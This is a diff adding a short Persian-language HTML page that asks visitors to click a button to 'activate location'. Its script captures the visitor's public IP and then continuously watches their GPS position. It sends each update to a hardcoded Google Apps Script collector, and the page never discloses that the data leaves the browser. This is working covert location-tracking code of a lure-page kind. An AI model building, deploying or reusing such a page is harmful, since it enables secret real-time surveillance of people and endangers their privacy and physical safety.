@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <title>مکان‌یابی زنده</title>
+  <style>
+    body {
+      background: linear-gradient(to bottom, #4b001f, #7f003f);
+      color: white;
+      font-family: 'Tahoma', sans-serif;
+      height: 100vh;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    h2 {
+      margin-bottom: 20px;
+    }
+
+    button {
+      background-color: #bf0040;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 18px;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #e6005c;
+    }
+  </style>
+</head>
+<body>
+  <h2>برای فعال‌سازی مکان‌یابی کلیک کنید</h2>
+  <button id="locateBtn">شروع</button>
+
+  <script>
+    document.getElementById('locateBtn').onclick = () => {
+      fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .then(data => {
+          const userIp = data.ip;
+
+          if (navigator.geolocation) {
+            navigator.geolocation.watchPosition(position => {
+              const latitude = position.coords.latitude;
+              const longitude = position.coords.longitude;
+
+              fetch("https://script.google.com/macros/s/AKfycbyKWjlc77AV4Ux003Vxe70nV3XOuxe4Jhs-2fz44AL8XpWzcq5PaFgQesG4bf4SpfWt/exec", {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                  lat: latitude,
+                  lon: longitude,
+                  ip: userIp
+                }),
+              });
+            });
+          } else {
+            alert("مرورگر شما از مکان‌یابی پشتیبانی نمی‌کند.");
+          }
+        });
+    };
+  </script>
+</body>
+</html>
